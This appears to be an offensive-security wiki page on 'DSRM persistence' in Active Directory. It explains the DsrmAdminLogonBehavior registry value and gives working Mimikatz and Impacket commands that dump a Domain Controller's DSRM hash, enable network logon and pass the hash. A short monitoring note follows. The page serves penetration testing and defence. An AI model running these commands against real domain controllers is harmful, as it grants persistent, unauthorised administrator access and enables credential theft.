---
authors: NevaSec, PvUL00
category: ad
---

# DSRM Persistence

## Theory

The Directory Services Restore Mode (DSRM) is a special mode available on every Domain Controller (DC) for recovery operations. When a server is promoted to a Domain Controller, a local administrator account named "Administrator" is created with a DSRM password. This password is rarely updated and is distinct from domain credentials, making it an interesting target for persistence.

An attacker with Domain Admin privileges (or local admin privileges on Domain Controllers) can retrieve the hash of the DSRM password using tools like Mimikatz and use it to maintain persistent access. By modifying specific configurations on the DC, it becomes possible to leverage the DSRM account remotely, including authenticating over the network.

The DSRM account, being a local administrator account on the DC, is not subject to domain password policies. However, by default, its use is limited to specific conditions, such as when the DC is booted into DSRM. These limitations can be bypassed by altering the registry key responsible for the account’s logon behavior.

The registry key `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` governs the conditions under which the DSRM account can be used:

- Value 0 (default): The account is usable only when the DC is started in DSRM.
- Value 1: Allows DSRM credentials when the local AD DS service is stopped.
- Value 2: Permits the use of DSRM credentials at all times, including over the network.

By exploiting these configurations, an attacker can utilize the DSRM account for long-term access to the DC without requiring domain credentials.

## Practice 

::: tabs

== Windows

[Mimikatz](https://github.com/gentilkiwi/mimikatz) can be used to perform the attack.

```powershell
# On the domain controller, retrieve the hash of the DSRM account (Administrator)
mimikatz.exe "token::elevate" "lsadump::sam"

# Set the registry key to allow login with the DSRM account
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD

# Use the hash to authenticate and run a new PowerShell process
mimikatz.exe "sekurlsa::pth /domain:$DC_HOST /user:Administrator /ntlm:$NT_HASH /run:powershell.exe"
```

== UNIX-like

[Impacket](https://github.com/fortra/impacket)'s `secretsdump.py`, `reg.py`, and `wmiexec.py` scripts can be used to perform the attack remotely.

```bash
# Retrieve the DSRM account hash from the DC's local SAM database (Administrator:500 entry)
secretsdump.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_IP"

# Set the registry key to allow DSRM account login over the network
reg.py "$DOMAIN"/"$USER":"$PASSWORD"@"$DC_IP" add -keyName 'HKLM\System\CurrentControlSet\Control\Lsa' -v DsrmAdminLogonBehavior -vt REG_DWORD -vd 2

# Authenticate to the DC using the DSRM hash (use DC hostname as domain)
wmiexec.py -hashes ":$NT_HASH" "$DC_HOST/Administrator@$DC_IP"
```

> [!NOTE]
> The DSRM account is a local account on the DC, not a domain account. When authenticating with pass-the-hash, the DC hostname (`$DC_HOST`) must be used as the domain, or `--local-auth` with tools like NetExec.

:::

## Mitigation

Monitor registry changes to `HKLM\System\CurrentControlSet\Control\Lsa\DsrmAdminLogonBehavior` and alert on values `1` or `2` (Event ID 4794).

## Resources

[https://adsecurity.org/?p=1714](https://adsecurity.org/?p=1714)

[https://adsecurity.org/?p=1785](https://adsecurity.org/?p=1785)
